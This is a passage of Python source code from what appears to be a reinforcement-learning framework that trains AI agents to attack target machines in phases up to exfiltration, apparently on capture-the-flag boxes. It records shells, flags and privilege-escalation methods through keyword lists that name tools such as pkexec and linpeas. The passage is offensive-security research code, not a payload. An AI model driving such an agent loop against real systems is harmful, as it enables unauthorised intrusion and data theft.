            self.dashboard.print_episode_summary(
                episode=episode_number,
                total_reward=episode_reward,
                total_steps=len(step_results),
                mentor_calls=total_mentor_calls,
                highest_phase=highest_phase_for_summary,
            )

        # ── P34-EXT: LearningMetrics episode summary to JSONL ────────
        if self.learning_metrics:
            try:
                _lm_summary = self.learning_metrics.get_episode_summary()
                metrics["learning_metrics"] = _lm_summary
            except Exception as _lm_err:
                logger.debug(f"P34-EXT: LearningMetrics episode summary error: {_lm_err}")

        # Legacy global PPO (kept for backward compat, no-op if trajectory empty)
        if self.ppo_agent and self._ppo_trajectory:
            try:
                for t in self._ppo_trajectory:
                    self.ppo_agent.store_transition(
                        state=t["state"],
                        action=t["action"],
                        log_prob=t["log_prob"],
                        reward=t["reward"],
                        value=t["value"],
                        done=t["done"],
                    )
                last_value = self._ppo_trajectory[-1]["value"] if self._ppo_trajectory[-1]["done"] else 0.0
                ppo_metrics = self.ppo_agent.update(last_value=last_value)
                if ppo_metrics:
                    metrics["ppo_policy_loss"] = ppo_metrics.get("policy_loss", 0.0)
                    metrics["ppo_value_loss"] = ppo_metrics.get("value_loss", 0.0)
            except Exception as e:
                logger.warning(f"Legacy PPO update error: {e}")
            finally:
                self._ppo_trajectory.clear()
        
        # ─── PHASE 8.2: End-of-episode postmortem analysis ──────────
        # Run OrionPostmortem EVERY episode (Phase 8.2: was every 2).
        # LIVE-only training demands maximum learning extraction per episode.
        # gpt-5.2-codex deep analysis with team coordination context.
        # Only run in LIVE mode — SIM mode skips expensive LLM postmortems.
        # CRITICAL: Entire block runs with a hard 45s timeout to prevent
        # blocking the training loop if GPT or parsing hangs.
        if self.postmortem and self.skill_library and self._is_live_mode:
            should_postmortem = True  # Phase 8.2: every episode for LIVE training
            if should_postmortem:
                import concurrent.futures as _cf
                def _run_postmortem():
                    # Build episode transcript for postmortem
                    transcript = self._build_episode_transcript(
                        step_results, phase_progression, episode_reward
                    )
                    
                    # Phase 8.2: Enhanced run trace with team coordination data
                    _chain_data = {}
                    for _ck, _coach in self.coaches.items():
                        _chain_data[_coach.agent_name] = {
                            "episode_chain": list(_coach._episode_chain[-10:]),
                            "best_chain": _coach._best_chain,
                            "failures": list(_coach._reasoning_failures[-5:]) if _coach._reasoning_failures else [],
                        }
                    
                    pm_result = self.postmortem.analyze_run(
                        run_trace={
                            "run_id": episode_id,
                            "transcript": transcript,
                            "total_episodes": 1,
                            "total_reward": episode_reward,
                            "success_rate": 1.0 if highest_phase in ("CLOSEOUT", "EXFILTRATION") else 0.0,
                            "total_mentor_calls": metrics.get("mentor_calls", 0),
                            "discoveries": {
                                k: list(v) if isinstance(v, set) else v
                                for k, v in self.discovery_board.items()
                                if k != "phase"
                            },
                            "phase_progression": phase_progression,
                            "agent_chains": _chain_data,
                            "target": str(target),
                        },
                    )
                    return pm_result
                
                try:
                    _pm_executor = _cf.ThreadPoolExecutor(max_workers=1)
                    _pm_future = _pm_executor.submit(_run_postmortem)
                    try:
                        pm_result = _pm_future.result(timeout=45)
                    except _cf.TimeoutError:
                        logger.warning("Phase 8.2: Postmortem timed out after 45s, skipping")
                        _pm_future.cancel()
                        _pm_executor.shutdown(wait=False, cancel_futures=True)
                        pm_result = None
                    else:
                        _pm_executor.shutdown(wait=False)
                    
                    if pm_result and pm_result.skill_cards:
                        for sc in pm_result.skill_cards:
                            self.skill_library.promote(sc, reason="postmortem")
                        logger.info(
                            f"Phase 8.2: Postmortem generated {len(pm_result.skill_cards)} skill cards"
                        )
                        metrics["postmortem_skills"] = len(pm_result.skill_cards)
                    
                    # Apply memory operations
                    if pm_result and pm_result.memory_ops:
                        for op in pm_result.memory_ops:
                            try:
                                if op.operation == "promote":
                                    self.skill_library.promote(op.target)
                                elif op.operation == "prune":
                                    self.skill_library.prune(op.target)
                            except Exception:
                                pass
                    
                    # Save skill library
                    self.skill_library._save_library()
                except Exception as e:
                    logger.warning(f"Phase 8.2: Postmortem error: {e}")
        
        # ─── PHASE 16.0: Progress Estimator — retroactive labeling + MLP training ──
        # After postmortem analysis, label the episode's progress trajectory
        # and train the progress MLP. Autonomy schedule gates GPT labeling.
        try:
            for _p16_cn, _p16_coach in self.coaches.items():
                _p16_pe = getattr(_p16_coach, '_p16_progress_estimator', None)
                if _p16_pe is None:
                    continue

                # Build run trace for retroactive labeling
                _p16_run_trace = {
                    "run_id": episode_id,
                    "total_reward": episode_reward,
                    "total_steps": len(step_results),
                    "success_rate": 1.0 if highest_phase in ("CLOSEOUT", "EXFILTRATION") else 0.0,
                    "phase_progression": phase_progression,
                    "discoveries": {
                        k: list(v) if isinstance(v, set) else v
                        for k, v in self.discovery_board.items()
                        if k != "phase"
                    },
                }

                # Autonomy schedule: GPT label only when needed
                _p16_gpt_mgr = None
                if _p16_pe.should_gpt_label(episode_number) and self._is_live_mode:
                    _p16_gpt_mgr = self.gpt_manager

                # Retroactive labeling (GPT or heuristic)
                _p16_labels = _p16_pe.label_episode_retroactively(
                    _p16_run_trace, gpt_manager=_p16_gpt_mgr,
                )

                # Add collected state vectors to dataset
                _p16_states = getattr(_p16_coach, '_p16_episode_states', [])
                if _p16_states and _p16_labels:
                    _p16_pe.add_labels_to_dataset(_p16_states, _p16_labels)

                # Train MLP on updated dataset
                _p16_train_metrics = _p16_pe.train_mlp()

                # Save dataset
                _p16_pe.save()

                logger.info(
                    f"[P16] {_p16_cn}: labels={len(_p16_labels)} "
                    f"dataset={_p16_pe.dataset_size} "
                    f"conf={_p16_pe.confidence:.2f} "
                    f"autonomy={_p16_pe.get_autonomy_level()} "
                    f"mlp_loss={_p16_train_metrics.get('loss', -1):.4f}"
                )
                metrics[f"p16_{_p16_cn}_confidence"] = _p16_pe.confidence
                metrics[f"p16_{_p16_cn}_dataset"] = _p16_pe.dataset_size
                metrics[f"p16_{_p16_cn}_autonomy"] = _p16_pe.get_autonomy_level()
        except Exception as e:
            logger.debug(f"[P16] Progress Estimator end-of-episode error: {e}")

        # ─── Phase 9: Orion Learning Optimizer — CognitiveBus narrative analysis ──
        # Feed episode narrative back into skill library for cross-episode learning.
        try:
            if hasattr(self, 'cognitive_bus') and self.cognitive_bus:
                narrative = self.cognitive_bus.get_episode_narrative()
                if narrative and self.skill_library:
                    # Extract high-value reasoning traces as micro-skills
                    from core.memory.unified_cognitive_bus import EventType
                    _events = self.cognitive_bus._episodes[-1] if self.cognitive_bus._episodes else []
                    _high_value_actions = [
                        e for e in _events
                        if e.event_type == EventType.ACTION and e.reward and e.reward > 15.0
                    ]
                    for hva in _high_value_actions[:5]:  # Top 5 high-value actions
                        from core.postmortem.skill_library import SkillCard
                        self.skill_library.promote(SkillCard(
                            name=f"ep{episode_number}_hv_{hva.agent_id}_{hva.data.get('command', 'cmd')[:20]}",
                            trigger=f"phase={hva.data.get('phase', 'unknown')}",
                            template=hva.data.get("command", ""),
                            expected_reward=hva.reward,
                            times_used=1,
                            avg_reward=hva.reward,
                            source=f"cognitive_bus_ep{episode_number}",
                        ))
                    
                    # Log learning signal aggregation
                    _agg = self.cognitive_bus._aggregator
                    if _agg and _agg.algorithm_performance:
                        _perf_summary = {
                            alg: f"calls={p.total_calls}, avg_r={p.avg_reward:.1f}"
                            for alg, p in _agg.algorithm_performance.items()
                        }
                        logger.info(f"Phase 9: LearningSignal — {_perf_summary}")
                        metrics["learning_signal"] = _perf_summary
        except Exception as e:
            logger.debug(f"Phase 9: Orion learning optimizer error: {e}")
        
        # ─── PHASE 6.3: Record episode to campaign memory ───────────
        if self.campaign_memory:
            try:
                # Collect all discoveries from this episode
                all_disc = {}
                for cat in ["ports", "services", "credentials", "vulns", "shells"]:
                    board_val = self.discovery_board.get(cat, set())
                    if board_val:
                        if cat == "ports":
                            all_disc["open_port"] = [int(p) for p in board_val if str(p).isdigit()]
                        elif cat == "services":
                            all_disc["service"] = list(board_val)
                        elif cat == "credentials":
                            all_disc["credential"] = True
                        elif cat == "shells":
                            all_disc["shell"] = True
                        elif cat == "vulns":
                            all_disc["vulnerability"] = True
                
                # Collect command chain (template names)
                cmd_chain = []
                for sr_list in step_results:
                    for sr in sr_list:
                        if sr.decision:
                            cmd_chain.append(sr.decision.template_name)
                
                self.campaign_memory.record_episode(
                    episode_num=episode_number,
                    discoveries=all_disc,
                    highest_phase=highest_phase,
                    command_chain=cmd_chain,
                    total_reward=episode_reward,
                )
                
                # Phase 11.1: Record pwn trajectory with flag capture info
                _has_shell = self.attack_context.state_flags.get("shell_obtained", False) if self.attack_context else False
                if _has_shell and cmd_chain:
                    _user_flag = self.attack_context.state_flags.get("user_flag_captured", False) if self.attack_context else False
                    _root_flag = self.attack_context.state_flags.get("root_flag_captured", False) if self.attack_context else False
                    _root_shell = self.attack_context.state_flags.get("root_shell_obtained", False) if self.attack_context else False
                    
                    # Determine entry point from first exploit command
                    _entry = "unknown"
                    for _c in cmd_chain:
                        if _c and any(x in _c.lower() for x in ["exploit", "ssh", "telnet", "shell", "backdoor", "login"]):
                            _entry = _c
                            break
                    
                    # Determine privesc method
                    _privesc = "none"
                    if _root_shell:
                        for _c in cmd_chain:
                            if _c and any(x in _c.lower() for x in ["sudo", "suid", "kernel", "pkexec", "linpeas"]):
                                _privesc = _c
                                break
                        if _privesc == "none":
                            _privesc = "direct_root_exploit"
                    
                    self.campaign_memory.record_pwn_trajectory(
                        episode_num=episode_number,
                        target=target or self.config.default_target,
                        command_chain=cmd_chain,
                        reasoning_chain=[f"Phase={highest_phase}, reward={episode_reward:.1f}"],
                        vulns_exploited=list(self.discovery_board.get("vulns", set())),
                        entry_point=_entry,
                        privesc_method=_privesc,
                        user_flag=_user_flag,
                        root_flag=_root_flag,
                        loopholes=[],
                        lessons=[f"Reached {highest_phase} with {len(cmd_chain)} commands"],
                    )
                
                # Auto-save every 5 episodes
                if (episode_number + 1) % 5 == 0:
                    self.campaign_memory.save()
            except Exception as e:
                logger.warning(f"Phase 6.3: Campaign memory record error: {e}")
        
        # ─── PHASE 6.3: Add watchdog stats to metrics ───────────────
        if self.watchdog:
            metrics["watchdog"] = self.watchdog.get_stats()
        if self.smart_parser:
            metrics["smart_parser"] = self.smart_parser.get_stats()
        
        # ─── Phase 9.7: Emit EpisodeEvent telemetry ─────────────────
        if self._telemetry_logger is not None:
            try:
                from core.telemetry.events import EpisodeEvent
                _parse_stats = {}
                if self._parse_cache:
                    _parse_stats = self._parse_cache.get_stats().__dict__ if hasattr(self._parse_cache.get_stats(), '__dict__') else {}
                ep_ev = EpisodeEvent(
                    run_id=self.run_id or "",
                    episode_id=episode_number,
                    total_steps=len(step_results),
                    total_reward=episode_reward,
                    final_phase=highest_phase,
                    closeout=highest_phase in ("CLOSEOUT", "EXFILTRATION"),
                    termination=self.episode_termination_reason.name,
                    unique_commands=metrics.get("unique_commands", 0),
                    diversity_ratio=metrics.get("diversity_ratio", 0.0),
                    total_discoveries=metrics.get("total_discoveries", 0),
                    total_parse_calls=_parse_stats.get("total_calls", 0),
                    total_parse_cache_hits=_parse_stats.get("hits", 0),
                    total_ddqn_calls=metrics.get("ddqn_macros", 0),
                    total_ddqn_cached=0,
                    anti_repeat_pct=(
                        source_counts.get("anti_repeat", 0) * 100.0
                        / max(sum(source_counts.values()), 1)
                    ),
                    source_distribution=source_counts,
                )
                self._telemetry_logger.log_episode(ep_ev)
            except Exception:
                pass  # Never let telemetry break training
        
        logger.debug(f"[DIAG] Episode {episode_number} complete, returning metrics")

        # ─── PHASE 15.0: Collect P15 telemetry ──────────────────────
        try:
            from core.feature_flags import get_feature_flags
            _ff15_tel = get_feature_flags()
            _any_p15 = any([
                _ff15_tel.neuromodulators, _ff15_tel.reflex_policy,
                _ff15_tel.action_arbitrator, _ff15_tel.working_memory,
                _ff15_tel.consolidation, _ff15_tel.aggression_controller,
                _ff15_tel.semantic_index, _ff15_tel.budget_manager_v2,
                _ff15_tel.sensory_buffer,
            ])
            if _any_p15:
                from core.telemetry.p15_telemetry import collect_episode_metrics
                _p15_metrics = collect_episode_metrics(
                    coaches=self.coaches,
                    gpt_manager=self.gpt_manager,
                    episode_id=episode_id,
                )
                metrics["p15_telemetry"] = _p15_metrics.to_dict()
        except Exception as e:
            logger.debug(f"[P15] Telemetry collection failed: {e}")

        return metrics
    
    # =========================================================================
    # PPO Checkpoint Persistence
    # =========================================================================
    
    def save_ppo_checkpoints(self, directory: str = "models/ppo_checkpoints"):
        """Save all per-coach PPO checkpoints for persistence across runs.
        
        Args:
            directory: Directory to save checkpoints into.
        """
        import os
        # Phase 7.3: Handle case where path exists as a regular file
        # (e.g. from CheckpointManager auto-save creating a .pt FILE at the
        #  same path this method needs as a DIRECTORY for per-agent saves)
        if os.path.isfile(directory):
            os.remove(directory)
            logger.info(f"Removed stale file at checkpoint path: {directory}")
        os.makedirs(directory, exist_ok=True)
        saved = 0
        for coach_name, coach in self.coaches.items():
            if hasattr(coach, 'ppo_agent') and coach.ppo_agent is not None:
                path = os.path.join(directory, f"ppo_{coach_name}.pt")
                try:
                    coach.ppo_agent.save(path)
                    saved += 1
                    logger.debug(f"Saved PPO checkpoint: {path}")
                except Exception as e:
                    logger.warning(f"Failed to save PPO for {coach_name}: {e}")
        logger.debug(f"Saved {saved} PPO checkpoints to {directory}")
        
        # Phase 9.0: Save DDQN macro checkpoints alongside PPO
        ddqn_saved = 0
        for coach_name, coach in self.coaches.items():
            if hasattr(coach, 'ddqn_macro') and coach.ddqn_macro is not None:
                path = os.path.join(directory, f"ddqn_{coach_name}.pt")
                try:
                    import torch
                    torch.save(coach.ddqn_macro.state_dict(), path)
                    ddqn_saved += 1
                except Exception as e:
                    logger.debug(f"Failed to save DDQN for {coach_name}: {e}")
        if ddqn_saved:
            logger.debug(f"Saved {ddqn_saved} DDQN macro checkpoints to {directory}")
    
    def load_ppo_checkpoints(self, directory: str = "models/ppo_checkpoints"):
        """Load per-coach PPO checkpoints from a previous run.
        
        Args:
            directory: Directory to load checkpoints from.
        """
        import os
        if not os.path.isdir(directory):
            logger.info(f"No PPO checkpoint directory found: {directory}")
            return
        loaded = 0
        for coach_name, coach in self.coaches.items():
            if hasattr(coach, 'ppo_agent') and coach.ppo_agent is not None:
                path = os.path.join(directory, f"ppo_{coach_name}.pt")
                if os.path.isfile(path):
                    try:
                        coach.ppo_agent.load(path)
                        loaded += 1
                        logger.debug(f"Loaded PPO checkpoint: {path} (updates={coach.ppo_agent.updates_done})")
                    except Exception as e:
                        logger.warning(f"Failed to load PPO for {coach_name}: {e}")
        logger.debug(f"Loaded {loaded} PPO checkpoints from {directory}")
        
        # Phase 9.0: Load DDQN macro checkpoints
        ddqn_loaded = 0
        for coach_name, coach in self.coaches.items():
            if hasattr(coach, 'ddqn_macro') and coach.ddqn_macro is not None:
                path = os.path.join(directory, f"ddqn_{coach_name}.pt")
                if os.path.isfile(path):
                    try:
                        import torch
                        state = torch.load(path, map_location="cpu", weights_only=False)
                        coach.ddqn_macro.load_state_dict(state)
                        ddqn_loaded += 1
                    except Exception as e:
                        logger.debug(f"Failed to load DDQN for {coach_name}: {e}")
        if ddqn_loaded:
            logger.debug(f"Loaded {ddqn_loaded} DDQN macro checkpoints from {directory}")

    def load_distilled_checkpoint(
        self,
        directory: str = "models/distilled",
        run_id: Optional[str] = None,
    ) -> bool:
        """Auto-load the best distilled checkpoint from GPU training runs.

        Scans *directory* for ``h200_*_ep*.pt`` files, picks the one with the
        highest episode number (from the latest run if *run_id* is None), and
        loads it directly into ``self.ppo_agent``.

        Args:
            directory: Directory containing distilled checkpoints.
            run_id: Optional run-id prefix filter (e.g. ``20260220T211736Z``).
                    When *None* the latest run is auto-detected.

        Returns:
            True if a checkpoint was loaded, False otherwise.
        """
        import os
        import re

        if self.ppo_agent is None:
            logger.debug("load_distilled_checkpoint: no PPO agent — skipping")
            return False

        if not os.path.isdir(directory):
            logger.debug(f"load_distilled_checkpoint: directory not found: {directory}")
            return False

        # Pattern: h200_<run_id>_ep<NNNN>.pt
        pattern = re.compile(r"h200_(.+?)_ep(\d+)\.pt$")
        candidates: list[tuple[str, str, int]] = []  # (path, run_id, ep_num)
        for fname in os.listdir(directory):
            m = pattern.match(fname)
            if m:
                candidates.append((
                    os.path.join(directory, fname),
                    m.group(1),
                    int(m.group(2)),
                ))

        if not candidates:
            logger.debug(f"load_distilled_checkpoint: no h200_*_ep*.pt files in {directory}")
            return False

        # Filter by run_id if specified
        if run_id:
            candidates = [c for c in candidates if c[1] == run_id]
            if not candidates:
                logger.warning(f"load_distilled_checkpoint: no checkpoints for run_id={run_id}")
                return False

        # Pick latest run_id (lexicographic = chronological for ISO timestamps),
        # then highest episode number within that run.
        latest_run = max(set(c[1] for c in candidates))
        run_candidates = [c for c in candidates if c[1] == latest_run]
        best = max(run_candidates, key=lambda c: c[2])
        best_path, best_run, best_ep = best

        try:
            self.ppo_agent.load(best_path)
            logger.info(
                f"[DISTILL] Loaded distilled checkpoint: {best_path} "
                f"(run={best_run}, ep={best_ep}, "
                f"updates={self.ppo_agent.updates_done}, "
                f"steps={self.ppo_agent.total_steps})"
            )
            try:
                from rich.console import Console as _C
                _C(force_terminal=True).print(
                    f"[green]\u2714 Distilled PPO loaded:[/green] "
                    f"run={best_run} ep={best_ep} "
                    f"({self.ppo_agent.updates_done} updates, "
                    f"{self.ppo_agent.total_steps} steps)"
                )
            except Exception:
                pass
            return True
        except Exception as e:
            logger.warning(f"load_distilled_checkpoint: failed to load {best_path}: {e}")
            return False

    # ------------------------------------------------------------------
    # Phase 41 → Phase 45c: Unified checkpoint loading
    # ------------------------------------------------------------------

    def _auto_load_all_checkpoints(self) -> int:
        """Auto-load best checkpoint into every coach via UnifiedCheckpoint.

        Search order:
          1. ``models/unified/`` — new unified format (highest priority)
          2. ``models/distilled/`` — GPU distilled legacy PPO
          3. ``models/enhanced/`` — local per-agent PPO + DDQN

        All legacy formats are transparently handled by
        ``UnifiedCheckpoint.load()``.

        Returns:
            Total number of algorithm instances loaded.
        """
        from core.checkpoints.unified_checkpoint import UnifiedCheckpoint

        loaded_total = 0
        console = None
        try:
            from rich.console import Console as _C
            console = _C(force_terminal=True)
        except Exception:
            pass

        # ── 1. Find best checkpoint (unified first, then legacy) ─────
        best_path = UnifiedCheckpoint.find_best()

        if best_path is None:
            logger.info("[AUTOLOAD] No checkpoints found in any directory")
            return 0

        try:
            ckpt = UnifiedCheckpoint.load(best_path)
        except Exception as e:
            logger.warning("[AUTOLOAD] Failed to load %s: %s", best_path, e)
            return 0

        logger.info("[AUTOLOAD] Best checkpoint: %s", ckpt.summary())

        # ── 2. Apply PPO to main ppo_agent ───────────────────────────
        if ckpt.ppo_state and self.ppo_agent is not None:
            if ckpt.apply_ppo(self.ppo_agent):
                loaded_total += 1
                logger.info(
                    "[AUTOLOAD] main PPO loaded: steps=%s, updates=%s",
                    ckpt.ppo_state.get("total_steps", 0),
                    ckpt.ppo_state.get("updates_done", 0),
                )

        # ── 3. Apply to each coach ───────────────────────────────────
        for coach_name, coach in self.coaches.items():
            # PPO — share the same checkpoint to all coaches
            if ckpt.ppo_state and hasattr(coach, "ppo_agent") and coach.ppo_agent is not None:
                if ckpt.apply_ppo(coach.ppo_agent):
                    loaded_total += 1

            # DDQN — per-agent if available
            if ckpt.ddqn_states and hasattr(coach, "ddqn_macro") and coach.ddqn_macro is not None:
                if ckpt.apply_ddqn(coach.ddqn_macro, coach_name):
                    loaded_total += 1

            # SAC — shared
            if ckpt.sac_state and hasattr(coach, "sac_agent") and coach.sac_agent is not None:
                if ckpt.apply_sac(coach.sac_agent):
                    loaded_total += 1

        # ── 4. Also scan for additional per-agent DDQN in enhanced ───
        #    (covers case where unified has PPO but enhanced has DDQN)
        enhanced_dir = Path("models/enhanced")
        if enhanced_dir.is_dir() and not ckpt.ddqn_states:
            for sub in sorted(enhanced_dir.iterdir(), reverse=True):
                if not sub.is_dir():
                    continue
                for coach_name, coach in self.coaches.items():
                    if not (hasattr(coach, "ddqn_macro") and coach.ddqn_macro is not None):
                        continue
                    ddqn_path = sub / f"ddqn_{coach_name}.pt"
                    if ddqn_path.is_file():
                        try:
                            ddqn_ckpt = UnifiedCheckpoint.load(ddqn_path)
                            if ddqn_ckpt.apply_ddqn(coach.ddqn_macro, coach_name):
                                loaded_total += 1
                                logger.info("[AUTOLOAD] %s: DDQN from %s", coach_name, sub.name)
                        except Exception:
                            pass

        # ── 5. Summary ───────────────────────────────────────────────
        if console and loaded_total > 0:
            console.print(
                f"[green]✔ Unified checkpoint loaded — {loaded_total} algorithms[/green]"
            )
            console.print(f"  [dim]{ckpt.summary()}[/dim]")

        logger.info("[AUTOLOAD] Total loaded: %d algorithm(s)", loaded_total)
        return loaded_total

    def save_unified_checkpoint(
        self,
        episode: int = 0,
        run_id: str = "",
        source: str = "local_train",
        metadata: Optional[Dict[str, Any]] = None,
    ) -> Optional[str]:
        """Save ALL algorithm states (PPO + DDQN + SAC) as a single unified checkpoint.

        This produces the same format that GPU distillation uses, so
        local and GPU training are perfectly interchangeable.

        Returns:
            Path to saved checkpoint, or None on failure.
        """
        from core.checkpoints.unified_checkpoint import UnifiedCheckpoint, UNIFIED_DIR

        try:
            ckpt = UnifiedCheckpoint.from_coaches(
                coaches=self.coaches,
                run_id=run_id or getattr(self, '_current_run_id', 'local'),
                episode=episode,
                source=source,
                metadata=metadata or {},
            )
            tag = f"ariaska_{ckpt.run_id}_ep{episode:04d}"
            path = UNIFIED_DIR / f"{tag}.pt"
            return ckpt.save(path)
        except Exception as e:
            logger.warning("Failed to save unified checkpoint: %s", e)
            return None

    def _build_episode_transcript(
        self,
        step_results: List[List["SmartStepResult"]],
        phase_progression: List[str],
        episode_reward: float,
    ) -> str:
        """Build a text transcript of the episode for postmortem analysis."""
        lines = [
            f"Episode Transcript (phases: {' → '.join(phase_progression)}, reward: {episode_reward:+.1f})",
            "=" * 60,
        ]
        for step_idx, sr_list in enumerate(step_results[:50]):  # Cap at 50 steps
            for sr in sr_list:
                d = sr.decision
                reward = sr.reward_breakdown.total if sr.reward_breakdown else 0.0
                lines.append(
                    f"Step {step_idx:3d} | {sr.agent_name:12s} | "
                    f"{d.source:10s} | {d.template_name:30s} | "
                    f"reward={reward:+6.1f} | phase={d.phase.name}"
                )
                if d.command_output:
                    snippet = d.command_output[:100].replace("\n", " ")
                    lines.append(f"          output: {snippet}")
        return "\n".join(lines)
    
    def _run_step(
        self,
        episode_id: str,
        step: int,
        state: Dict[str, Any],
    ) -> Tuple[List[SmartStepResult], float, Dict[str, Any], bool]:
        """
        Run a single step with all agents using smart coaching.
        
        Each agent picks DIFFERENT commands based on their role.
        
        Returns:
            (agent_results, reward, new_state, done)
        """
        agent_results: List[SmartStepResult] = []
        
        # Build step context
        ctx = self.attack_context
        
        # Actions to execute
        red_action = None
        blue_action = None
        
        # Clear used commands for this step (deduplication)
        step_used_commands: set = set()
        for coach in self.coaches.values():
            if hasattr(coach, 'clear_step_commands'):
                coach.clear_step_commands()

        # ─── Phase 39: OpsHub on_step_start ──────────────────────────
        if self.ops_hub is not None:
            try:
                self.ops_hub.on_step_start(step)
            except Exception as _e:
                logger.debug(f"[P39] OpsHub on_step_start error: {_e}")

        # Phase 23: Clear per-step GPT call buffer so we track only this step's calls
        if hasattr(self.gpt_manager, 'clear_step_calls'):
            self.gpt_manager.clear_step_calls()
        
        # ─── P35: Build canonical state + run coherence chain ──
        current_phase = self.attack_context.current_phase.name if self.attack_context else "RECON"
        self._run_coherence_pre_step(episode_id, step, current_phase)
        
        # Process each agent IN ORDER - each sees what previous agents picked
        # Use PHASE-OPTIMIZED order for maximum synergy
        agent_order = self.get_optimal_agent_order(current_phase)
        
        # P36: Track structured skip reasons for dashboard visibility
        self._p36_skip_reasons: Dict[str, str] = {}
        _p36_skip_reasons = self._p36_skip_reasons
        
        for agent_name in agent_order:
            if agent_name not in self.agents or agent_name not in self.coaches:
                continue
            
            # P36: Value-based activation with structured skip reasons
            _activate, _skip_reason = self._should_activate(agent_name, step, current_phase)
            if not _activate:
                _p36_skip_reasons[agent_name] = _skip_reason
                continue
            
            agent = self.agents[agent_name]
            coach = self.coaches[agent_name]
            
            # Share used commands with this coach
            if hasattr(coach, 'step_used_commands'):
                coach.step_used_commands = step_used_commands
            
            # =========================================================================
            # PHASE 0.1: ENHANCED STUCK DETECTION
            # =========================================================================
            
            # Check legacy stuck (for backward compat)
            is_legacy_stuck = self._check_if_stuck(agent_name)
            
            # Check repeat-stuck (Phase 0.1: consecutive same actions OR stagnation)
            is_repeat_stuck, repeat_count = self._check_repeat_stuck(agent_name)
            
            # Check deep-stuck (too many forced-novel failures)
            is_deep_stuck = self._check_deep_stuck(agent_name)
            
            # Debug log for stuck detection (every 10 steps, DEBUG level)
            if step % 10 == 0:
                stagnation = self._steps_without_discoveries.get(agent_name, 0)
                logger.debug(
                    f"[STUCK-CHECK][{agent_name}] step={step} "
                    f"repeat_stuck={is_repeat_stuck} repeat_count={repeat_count} "
                    f"stagnation={stagnation}/{self.config.stuck_repeat_threshold}"
                )
            
            # Build smart step context
            # Phase 4: Inject discovery board into state for cross-agent awareness
            enriched_state = dict(state) if isinstance(state, dict) else {}
            enriched_state["discovery_board"] = {
                k: list(v) if isinstance(v, set) else v
                for k, v in self.discovery_board.items()
            }
            # Ensure target IP is accessible from discovery_board
            enriched_state["discovery_board"]["target"] = ctx.target if ctx else self.config.default_target
            # Phase 7.1: Also pass exploited-service data as raw sets for filtering
            enriched_state["discovery_board"]["exploited_services"] = self.discovery_board.get("exploited_services", set())
            enriched_state["discovery_board"]["exploited_ports"] = self.discovery_board.get("exploited_ports", set())
            step_ctx = SmartStepContext(
                episode=self.current_episode,
                step=step,
                agent_name=agent_name,
                attack_context=ctx,  # type: ignore[arg-type]
                state=enriched_state,
            )
            
            # =========================================================================
            # PHASE 0.1: STUCK-ESCAPE LOGIC
            # =========================================================================
            decision = None
            
            if is_repeat_stuck:
                # Update repeat stuck counter
                self.repeat_stuck_count[agent_name] = self.repeat_stuck_count.get(agent_name, 0) + 1
                
                # Force novel action with tag-based masking
                decision = coach._force_novel_action(
                    step_ctx,
                    thresholds=[
                        self.config.stuck_tag_overlap_threshold,
                        0.6,
                        0.4,
                        0.0,
                    ],
                )
                
                if decision is not None:
                    # Check if forced action is same as last (deep stuck)
                    last_action = self.action_history.get(agent_name, [""])[-1] if self.action_history.get(agent_name) else ""
                    if decision.command == last_action:
                        self.deep_stuck_count[agent_name] = self.deep_stuck_count.get(agent_name, 0) + 1
                        logger.debug(
                            f"[DEEP-STUCK][{agent_name}] forced-novel returned same action "
                            f"count={self.deep_stuck_count[agent_name]}/{self.config.stuck_forced_abort_threshold}"
                        )
                    else:
                        # Successful novel action
                        self.forced_novel_count[agent_name] = self.forced_novel_count.get(agent_name, 0) + 1
                        self.repeat_stuck_count[agent_name] = 0  # Reset repeat counter
                        
                        logger.debug(
                            f"[FORCED-NOVEL][{agent_name}] "
                            f"prev={last_action[:30]}... → new={decision.command[:30]}... "
                            f"tags_recent={{...}} excluded={decision.excluded_count}"
                        )
                        
                        self.dashboard.add_event(
                            "forced_novel",
                            f"Forced: {decision.template_name}",
                            agent_name
                        )
                else:
                    # R43: forced-novel cap reached (returned None) — fall through to normal pipeline
                    is_repeat_stuck = False
                    logger.debug(f"[FORCED-NOVEL][{agent_name}] Cap reached, falling through to normal pipeline")
            
            if not is_repeat_stuck and decision is None:
                # HTB D1: FollowupQueue — consume highest-priority queued command
                # before falling through to normal decision flow
                if hasattr(self, 'followup_queue') and self.followup_queue:
                    # Decrement TTL and remove expired entries
                    self.followup_queue = [
                        fq for fq in self.followup_queue
                        if fq.get("ttl", 0) > 0
                    ]
                    if self.followup_queue:
                        # Sort by priority (highest first)
                        self.followup_queue.sort(key=lambda x: x.get("priority", 0), reverse=True)
                        fq_entry = self.followup_queue.pop(0)
                        # Decrement TTL of remaining entries
                        for fq in self.followup_queue:
                            fq["ttl"] = fq.get("ttl", 1) - 1
                        decision = SmartDecisionResult(
                            command=fq_entry["command"],
                            source=fq_entry.get("source", "followup_queue"),
                            confidence=0.90,
                            template_name=f"followup_{fq_entry.get('service', 'generic')}",
                            params={},
                            reasoning=fq_entry.get("description", "Followup queue command"),
                            phase=ctx.current_phase if ctx is not None else AttackPhase.RECON,
                            mentor_call=False,
                        )
                        logger.debug(
                            f"[FOLLOWUP-Q][{agent_name}] Consumed: {decision.command[:80]} "
                            f"(source={fq_entry.get('source')}, remaining={len(self.followup_queue)})"
                        )
                
                if decision is None:
                    # Normal decision flow (also handles forced-novel cap fallthrough)
                    # Get agent's proposed action (for comparison)
                    proposed_action, confidence = self._get_agent_proposal(agent, state)
                    
                    # Force low confidence if legacy stuck
                    force_mentor = is_legacy_stuck and self.config.stuck_force_mentor
                    if force_mentor:
                        confidence = 0.1
                    
                    # Get smart decision (role-aware)
                    decision = coach.decide(step_ctx, proposed_action, confidence)
                    # Only set source if coach didn't already set a specific one
                    # Coach may have set: "ppo", "playbook", "anti_repeat", etc.
                    if decision.source == "unknown":
                        decision.source = "mentor" if decision.mentor_call else "registry"
            
            # R43: Safety guard — if decision is still None after all pipelines, skip this agent
            if decision is None:
                logger.warning(f"[SKIP][{agent_name}] All decision pipelines returned None — skipping agent this step")
                continue
            
            # Phase 42: Cross-agent command dedup — prevent Orion+Red firing same nmap/gobuster
            _cmd_base = decision.command.split()[0] if decision.command else ""
            _cmd_prefix = decision.command[:50]
            if _cmd_prefix in step_used_commands or (
                _cmd_base in step_used_commands and agent_name != "RedAgent"
            ):
                logger.info(
                    f"[CROSS-DEDUP][{agent_name}] Skipping duplicate command: "
                    f"{decision.command[:60]}... (base={_cmd_base} already used this step)"
                )
                _p36_skip_reasons[agent_name] = f"cross_dedup: {_cmd_base}"
                continue
            # Also track the base command tool name for future agents this step
